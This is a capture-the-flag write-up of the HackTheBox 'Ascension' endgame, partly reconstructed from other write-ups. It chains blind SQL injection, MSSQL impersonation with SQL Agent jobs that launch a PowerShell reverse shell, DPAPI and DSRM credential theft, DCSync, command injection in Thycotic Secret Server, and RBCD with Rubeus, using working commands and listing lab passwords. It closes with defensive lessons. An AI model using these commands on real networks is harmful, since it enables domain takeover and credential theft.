---
title: "Ascension"
date: 2020-02-13
type: docs
tags:
  - htb
  - endgame
  - active-directory
  - multi-forest
  - blind-sqli
  - sqlmap
  - mssql
  - execute-as
  - sql-agent-job
  - proxy-account
  - dpapi
  - dsrm
  - dcsync
  - forest-trust
  - thycotic-secret-server
  - command-injection
  - rbcd
  - rubeus
  - s4u
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox , **Endgame** (7 flags, two AD forests: `daedalus.local` and `megaairline.local`), **Released:** 2020-02-13, entry point `10.13.38.20`

</div>

<div class="callout callout-warning">

**Partial**

My notes cover the SQL injection and the sqlmap database enumeration on the first host only. The full seven-flag chain below is reconstructed from published writeups (snovvcra.sh, byte-mind.net) and marked. The raw sqlmap dump of `master` / `msdb` system tables has been trimmed.

</div>

<div class="callout callout-abstract">

**Attack Path (7 flags)**

1. **WEB01** , `book-trip.php` `destination` param is **blind SQLi** against MSSQL. The web login (`daedalus`) can **`EXECUTE AS` `daedalus_admin`**, who holds the SQLAgent roles. Create a **SQL Server Agent job** with a `CmdExec` step running under a **proxy account** , shell as `IIS APPPOOL\DefaultAppPool`. **Flag 1**.
2. Enumerate the host: a scheduled task and LSASS/DPAPI give **`DAEDALUS\billing_user`** (local admin on WEB01) and the MSSQL service account. WinRM as `billing_user`. **Flag 2**.
3. A mounted backup drive holds the **DSRM** password for `DC1`, and DPAPI decrypts the **Domain Admin** password (`pleasefastenyourseatbelts01!`). `secretsdump.py` with DSRM (or DA) dumps NTDS. **Flags 3 to 4** on `DC1`.
4. `daedalus.local` has a **forest trust** to `megaairline.local`. `DAEDALUS\elliot`'s cracked NTLM password (`84@m!n@9`) is valid there.
5. **MS01** runs **Thycotic Secret Server**. `AdminScripts.aspx` has **command injection** (`foo || <cmd> || bar`). **Flag 5**.
6. On MS01: Slack IndexedDB and DPAPI give `LetMeInAgain!` and `MEGAAIRLINE\anna : FWErfsgt4ghd7f6dwx` (reused for local admin). **Flag 6**.
7. As `anna`: **RBCD** attack , `Powermad` adds a machine account, `Set-DomainRBCD` on `DC2`, `Rubeus s4u` impersonates administrator , DCSync `DC2`. **Flag 7**.

</div>

<div class="callout callout-key">

**Credentials (recovered along the way)**


| Account | Value |
| --- | --- |
| `daedalus` (web SQL login) , can impersonate `daedalus_admin` | |
| `DAEDALUS\Administrator` (DPAPI) | `pleasefastenyourseatbelts01!` |
| DSRM (DC1) | `kF4df76fj*JfAcf73j` |
| `DAEDALUS\elliot` (cracked) | `84@m!n@9` |
| `MEGAAIRLINE\anna` | `FWErfsgt4ghd7f6dwx` |

</div>

---

## Overview

Ascension is the "airline" endgame: a full red-team style chain across **two forests**, starting from a single blind SQL injection on a booking site. The teaching value is enormous because it strings together techniques you normally practise in isolation: **MSSQL `EXECUTE AS` impersonation** and **SQL Agent proxy jobs** for RCE without `xp_cmdshell`, **DPAPI** credential recovery, the **DSRM** account, **NTDS** extraction, **forest trust** enumeration, a real product (**Thycotic Secret Server**) with a command injection, browser credential stores, and finally **Resource-Based Constrained Delegation** for the second DC. It is a masterclass in "one small bug, patient enumeration, total compromise".

Related MSSQL boxes: [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/), [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/). Related DCSync finish: [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [Reset](/writeups/tryhackme/windows/hard/reset/). Related RBCD / S4U: [Enterprise](/writeups/tryhackme/windows/hard/enterprise/).

---

## Full Walkthrough

### Stage 1, WEB01 , blind SQLi to RCE

The site is "Daedalus Airlines" on IIS. `book-trip.php` (`destination` parameter) is blind SQL injectable against MSSQL.

```bash
sqlmap -r booktrip.req -p destination --dbms mssql --batch --level 3 --risk 3
sqlmap -r booktrip.req -p destination --dbms mssql --dbs
# daedalus, logs, master, model, msdb, tempdb
```

<div class="callout callout-note">

**From SQLi to a shell without xp_cmdshell**

`xp_cmdshell` and `xp_dirtree` are blocked. But `sys.server_permissions` shows the web login `daedalus` has **`IMPERSONATE`** on `daedalus_admin`, and `daedalus_admin` is in `SQLAgentUserRole` / `SQLAgentOperatorRole`. The path (Optiv's "MSSQL Agent Jobs for Command Execution"):
```sql
EXECUTE AS LOGIN = 'daedalus_admin';
EXEC msdb.dbo.sp_help_proxy;                       -- find a proxy account
EXEC msdb.dbo.sp_add_job @job_name = 'x';
EXEC msdb.dbo.sp_add_jobstep @job_name='x', @step_name='s',
     @subsystem='CmdExec', @proxy_name='<proxy>',
     @command='powershell -e <b64 reverse shell>';
EXEC msdb.dbo.sp_add_jobserver @job_name='x';
EXEC msdb.dbo.sp_start_job @job_name='x';
```
The job runs as the proxy's credential and your PowerShell fires. **Flag 1** as `IIS APPPOOL\DefaultAppPool`.

</div>

### Stage 2, WEB01 local admin

`Seatbelt` / `Inveigh` on WEB01: a scheduled task references `FIN01` and carries credentials for **`DAEDALUS\billing_user`** (a local admin). LSASS / `SharpDPAPI` also yield the MSSQL service account and Credential Manager entries.

```bash
evil-winrm -i web01.daedalus.local -u billing_user -p '<pw>'
```

**Flag 2**.

### Stage 3, DC1 , DSRM and DPAPI to Domain Admin

`winPEAS` finds a mounted backup drive with the **DSRM** administrator password for `DC1`. DPAPI decryption of a stored blob gives the **Domain Admin** password `pleasefastenyourseatbelts01!`.

<div class="callout callout-note">

**DSRM as a local admin**

The Directory Services Restore Mode account is a *local* administrator on a DC. With `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior = 2`, you can authenticate to the DC over the network with the DSRM hash/password and then `secretsdump`:
```bash
secretsdump.py -just-dc 'daedalus.local/administrator@dc1.daedalus.local'
```

</div>

**Flags 3 and 4** on `DC1`.

### Stage 4, the forest trust

```powershell
Import-Module PowerView.ps1
Get-DomainTrust ; Invoke-MapDomainTrust
# daedalus.local <--> megaairline.local  (forest, transitive)
```

`secretsdump` on DC1 gave `DAEDALUS\elliot`'s NTLM (`74fdf381a94e1e446aaedf1757419dcd`), which cracks to `84@m!n@9` and, thanks to the trust and password reuse, is valid in `megaairline.local`.

### Stage 5, MS01 , Thycotic Secret Server command injection

Tunnel into `192.168.11.0/24` (Neo-reGeorg / chisel). `MS01.megaairline.local` hosts **Thycotic Secret Server**. `AdminScripts.aspx` (the SSH script editor) does not sanitise a parameter:

```
foo || powershell -e <b64 whoami> || bar
```

<div class="callout callout-note">

**`||` command injection**

The value is concatenated into a shell command joined with `||`. `foo` fails, `||` runs your command, `|| bar` swallows the tail. Read the flag: `type c:\users\elliot\desktop\flag.txt`. **Flag 5**.

</div>

### Stage 6, MS01 local admin

- Chrome IndexedDB / Slack blob analysis recovers `LetMeInAgain!`.
- `SharpDPAPI` recovers `MEGAAIRLINE\anna : FWErfsgt4ghd7f6dwx`, reused for the local Administrator.

RDP/WinRM as the local admin. **Flag 6**.

### Stage 7, DC2 , RBCD

As `anna`:

```powershell
# 1. add a machine account we control
.\Powermad.ps1; New-MachineAccount -MachineAccount iLovePizza -Password (ConvertTo-SecureString 'Passw0rd!' -AsPlainText -Force)
# 2. configure DC2 to trust it for delegation
Set-DomainRBCD -Identity DC2 -DelegateFrom iLovePizza
# 3. impersonate administrator to a DC2 service
.\Rubeus.exe hash /password:Passw0rd! /user:iLovePizza
.\Rubeus.exe s4u /user:iLovePizza$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/dc2.megaairline.local /ptt
```

<div class="callout callout-note">

**RBCD**

If you can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a computer object (which `anna` can, for `DC2`), you set it to a principal you control, then use S4U2self + S4U2proxy (`Rubeus s4u`) to get a service ticket to that computer **as any user**, including `administrator`. From a `cifs`/`host`/`ldap` ticket to `DC2` you DCSync.

</div>

```bash
secretsdump.py -k -no-pass dc2.megaairline.local -just-dc
wmiexec.py -hashes :<admin hash> 'megaairline.local/administrator@dc2.megaairline.local'
```

**Flag 7**. Both forest roots owned.

---

## Loot

Seven flags across `WEB01`, `DC1` (x2), `MS01` (x2), and `DC2`. See the Attack Path table for which stage yields which.

---

## Lessons and Takeaways

- **Parameterise queries.** One blind SQLi on a booking form led to two forest compromises.
- **Do not grant `IMPERSONATE` on privileged SQL logins**, and lock down SQL Agent proxies. `EXECUTE AS` + a `CmdExec` job is RCE without `xp_cmdshell`.
- **DSRM is a DC local admin.** Set `DsrmAdminLogonBehavior` to 0, and store DSRM passwords in a vault, not on a backup share.
- **DPAPI protects nothing from a local admin / SYSTEM.** Assume any credential ever entered on a host is recoverable.
- **Forest trusts are transitive attack paths.** Password reuse across a trust (`elliot`, `anna`) collapses the boundary.
- **Audit `msDS-AllowedToActOnBehalfOfOtherIdentity` write rights.** RBCD is a one-line path to impersonating Domain Admin on a DC.
- **Patch and isolate Secret Server** (and any PAM product). A command injection in the thing that holds every password is catastrophic.

---

## Related Writeups

- **MSSQL impersonation / agent jobs / xp_cmdshell:** [EscapeTwo](/writeups/hackthebox/windows/easy/escapetwo/), [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/)
- **DPAPI / DSRM / NTDS extraction:** [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/), [Reset](/writeups/tryhackme/windows/hard/reset/)
- **DCSync:** [Attacktive Directory](/writeups/tryhackme/windows/medium/attacktive-directory/), [VulnNet Roasted](/writeups/tryhackme/windows/medium/vulnnet-roasted/)
- **RBCD / S4U constrained delegation:** [Enterprise](/writeups/tryhackme/windows/hard/enterprise/)
- **Forest / domain trust abuse:** [Crocc Crew](/writeups/tryhackme/windows/insane/crocc-crew/)

## References

- HTB Ascension (snovvcra.sh) <https://snovvcra.sh/2024/04/30/htb-ascension.html>
- HTB Ascension (byte-mind.net) <https://byte-mind.net/hackthebox-endgames-ascension-writeup/>
- MSSQL Agent Jobs for Command Execution (Optiv) <https://www.optiv.com/insights/source-zero/blog/mssql-agent-jobs-command-execution>
- Wagging the Dog (RBCD, Elad Shamir) <https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html>
